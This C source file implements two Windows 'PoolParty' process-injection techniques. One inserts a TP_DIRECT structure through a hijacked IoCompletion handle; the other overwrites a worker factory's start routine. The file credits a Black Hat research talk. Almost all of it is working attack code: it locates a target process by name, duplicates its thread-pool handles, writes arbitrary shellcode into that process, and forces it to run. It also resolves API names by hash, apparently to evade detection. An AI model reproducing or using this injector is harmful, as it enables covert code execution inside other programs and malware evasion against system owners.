/*
 *  PoolParty — Thread Pool Process Injection
 *  Techniques adapted from @_0xDeku (Black Hat EU 2023)
 *  https://github.com/SafeBreach-Labs/PoolParty
 *
 *  Variant 1 : WorkerFactory start-routine overwrite  (PoolPartyWfOverwrite)
 *  Variant 7 : TP_DIRECT insertion via IoCompletion   (PoolPartyTpDirect)
 */

#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <wchar.h>

#include "poolparty.h"
#include "functions.h"

/* ── Internal: find a process PID by name (case-insensitive) ─────────── */
static DWORD PP_GetPidByName(LPCSTR szName) {
    DWORD  dwPid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, szName) == 0) {
                dwPid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return dwPid;
}

/* ── Internal: duplicate a handle of a given type from hProcess ─────── */
/*
 *  Walks the target process handle table via NtQueryInformationProcess
 *  (ProcessHandleInformation = 51), duplicates each handle into the current
 *  process, and uses NtQueryObject to check the kernel object type name.
 *  Returns the duplicated handle on match, or NULL on failure.
 */
static HANDLE PP_HijackHandle(
        HANDLE      hProcess,
        LPCWSTR     wsTypeName,
        ACCESS_MASK dwAccess) {

    HMODULE hNtdll = GetModuleHandleH(#-NTDLL_VALUE-#);

    fnNtQueryInformationProcess fpNtQIP = (fnNtQueryInformationProcess)
        GetProcAddressH(hNtdll, #-NTQIP_VALUE-#);
    fnNtQueryObject fpNtQO = (fnNtQueryObject)
        GetProcAddressH(hNtdll, #-NTQO_VALUE-#);

    if (!fpNtQIP || !fpNtQO)
        return NULL;

    /* Grow the buffer until NtQueryInformationProcess is satisfied */
    ULONG              uSize  = 0x8000;
    PPP_HANDLE_SNAPSHOT pSnap  = NULL;
    NTSTATUS           status = STATUS_INFO_LENGTH_MISMATCH;

    while (status == (NTSTATUS)STATUS_INFO_LENGTH_MISMATCH ||
           status == (NTSTATUS)STATUS_BUFFER_TOO_SMALL) {
        if (pSnap)
            HeapFree(GetProcessHeap(), 0, pSnap);
        uSize *= 2;
        pSnap = (PPP_HANDLE_SNAPSHOT)HeapAlloc(GetProcessHeap(),
                                                HEAP_ZERO_MEMORY, uSize);
        if (!pSnap)
            return NULL;
        status = fpNtQIP(hProcess, PP_ProcessHandleInformation,
                         pSnap, uSize, &uSize);
    }

    if (status != 0) {
        HeapFree(GetProcessHeap(), 0, pSnap);
        return NULL;
    }

    HANDLE hFound = NULL;
    USHORT wTargetLen = (USHORT)wcslen(wsTypeName);

    for (ULONG_PTR i = 0; i < pSnap->NumberOfHandles; i++) {
        HANDLE hDup = NULL;
        if (!DuplicateHandle(hProcess,
                             pSnap->Handles[i].HandleValue,
                             GetCurrentProcess(),
                             &hDup,
                             dwAccess, FALSE, 0))
            continue;

        /* Use a stack buffer — type names are short (<64 chars) */
        BYTE   buf[512] = { 0 };
        NTSTATUS qoStatus = fpNtQO(hDup, PP_ObjectTypeInformation,
                                   buf, sizeof(buf), NULL);
        if (qoStatus != 0) {
            CloseHandle(hDup);
            continue;
        }

        PPP_OBJECT_TYPE_INFO pInfo = (PPP_OBJECT_TYPE_INFO)buf;

        /* TypeName.Length is in bytes — convert to wchar count */
        USHORT wLen = pInfo->TypeName.Length / sizeof(WCHAR);

        if (pInfo->TypeName.Buffer != NULL &&
            wLen == wTargetLen &&
            wcsncmp(pInfo->TypeName.Buffer, wsTypeName, wLen) == 0) {
            hFound = hDup;
            break;
        }

        CloseHandle(hDup);
    }

    HeapFree(GetProcessHeap(), 0, pSnap);
    return hFound;
}

/* ── Variant 7: TP_DIRECT insertion via IoCompletion ─────────────────── */
/*
 *  1. Finds the target process by name and opens it.
 *  2. Hijacks the IoCompletion handle from the target's thread pool.
 *  3. Allocates RWX memory in the target and writes the shellcode.
 *  4. Crafts a TP_DIRECT structure with Callback = shellcode address.
 *  5. Allocates the TP_DIRECT in the target process and writes it.
 *  6. Calls ZwSetIoCompletion to queue a packet — the target's thread
 *     pool dequeues it and dispatches to our shellcode.
 */
BOOL PoolPartyTpDirect(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode,
                       IN LPCSTR szTarget) {

    fnZwSetIoCompletion fpZwSIC = (fnZwSetIoCompletion)
        GetProcAddressH(GetModuleHandleH(#-NTDLL_VALUE-#), #-ZSETIO_VALUE-#);

    if (!fpZwSIC)
        return FALSE;

    /* Step 1: locate the target process */
    DWORD dwPid = PP_GetPidByName(szTarget);
    if (!dwPid)
        return FALSE;

    /* Step 2: open it with VM + handle duplication privileges */
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
        FALSE, dwPid);
    if (!hProcess)
        return FALSE;

    /* Step 3: hijack the IoCompletion handle from the target's thread pool */
    HANDLE hIoCompletion = PP_HijackHandle(hProcess, L"IoCompletion",
                                           IO_COMPLETION_ALL_ACCESS);
    if (!hIoCompletion) {
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Step 4: allocate RWX memory in the target and write the shellcode */
    PVOID pRemoteShellcode = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_EXECUTE_READWRITE);
    if (!pRemoteShellcode) {
        CloseHandle(hIoCompletion);
        CloseHandle(hProcess);
        return FALSE;
    }

    SIZE_T dwWritten = 0;
    if (!WriteProcessMemory(hProcess, pRemoteShellcode,
                            pShellcode, sSizeOfShellcode, &dwWritten)) {
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hIoCompletion);
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Step 5: craft TP_DIRECT with shellcode address as the callback */
    PP_TP_DIRECT Direct;
    RtlSecureZeroMemory(&Direct, sizeof(Direct));
    Direct.Callback = pRemoteShellcode;

    PVOID pRemoteDirect = VirtualAllocEx(hProcess, NULL, sizeof(PP_TP_DIRECT),
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_READWRITE);
    if (!pRemoteDirect) {
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hIoCompletion);
        CloseHandle(hProcess);
        return FALSE;
    }

    WriteProcessMemory(hProcess, pRemoteDirect,
                       &Direct, sizeof(PP_TP_DIRECT), NULL);

    /* Step 6: queue the IO completion packet — triggers execution */
    NTSTATUS status = fpZwSIC(hIoCompletion, pRemoteDirect, NULL, 0, 0);

    CloseHandle(hIoCompletion);
    CloseHandle(hProcess);

    return (status == 0);
}

/* ── Variant 1: WorkerFactory start-routine overwrite ────────────────── */
/*
 *  1. Finds the target process by name and opens it.
 *  2. Hijacks the TpWorkerFactory handle from the target's thread pool.
 *  3. Queries worker factory basic info to get StartRoutine + TotalWorkerCount.
 *  4. Overwrites StartRoutine in the target process with the shellcode
 *     (WriteProcessMemory bypasses page protection internally).
 *  5. Bumps the minimum thread count via NtSetInformationWorkerFactory,
 *     forcing the thread pool to spawn a new worker that jumps to our code.
 */
BOOL PoolPartyWfOverwrite(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode,
                          IN LPCSTR szTarget) {

    HMODULE hNtdll = GetModuleHandleH(#-NTDLL_VALUE-#);

    fnNtQueryInformationWorkerFactory fpNtQIWF =
        (fnNtQueryInformationWorkerFactory)
        GetProcAddressH(hNtdll, #-NTQIWF_VALUE-#);

    fnNtSetInformationWorkerFactory fpNtSIWF =
        (fnNtSetInformationWorkerFactory)
        GetProcAddressH(hNtdll, #-NTSIWF_VALUE-#);

    if (!fpNtQIWF || !fpNtSIWF)
        return FALSE;

    /* Step 1: locate the target process */
    DWORD dwPid = PP_GetPidByName(szTarget);
    if (!dwPid)
        return FALSE;

    /* Step 2: open it — VM write + handle duplication */
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
        FALSE, dwPid);
    if (!hProcess)
        return FALSE;

    /* Step 3: hijack the TpWorkerFactory handle */
    HANDLE hWorkerFactory = PP_HijackHandle(hProcess, L"TpWorkerFactory",
                                            WORKER_FACTORY_ALL_ACCESS);
    if (!hWorkerFactory) {
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Step 4: query basic info — we need StartRoutine and TotalWorkerCount */
    PP_WF_BASIC_INFO wfInfo;
    RtlSecureZeroMemory(&wfInfo, sizeof(wfInfo));

    if (fpNtQIWF(hWorkerFactory, (ULONG)PPWorkerFactoryBasicInformation,
                 &wfInfo, sizeof(wfInfo), NULL) != 0) {
        CloseHandle(hWorkerFactory);
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Step 5: overwrite the start routine with our shellcode */
    /* WriteProcessMemory writes through page protection — no VirtualProtectEx needed */
    SIZE_T dwWritten = 0;
    if (!WriteProcessMemory(hProcess, wfInfo.StartRoutine,
                            pShellcode, sSizeOfShellcode, &dwWritten)) {
        CloseHandle(hWorkerFactory);
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Step 6: bump minimum thread count to force a new worker to start */
    ULONG uMinThreads = wfInfo.TotalWorkerCount + 1;
    fpNtSIWF(hWorkerFactory, (ULONG)PPWorkerFactoryThreadMinimum,
             &uMinThreads, sizeof(ULONG));

    CloseHandle(hWorkerFactory);
    CloseHandle(hProcess);
    return TRUE;
}
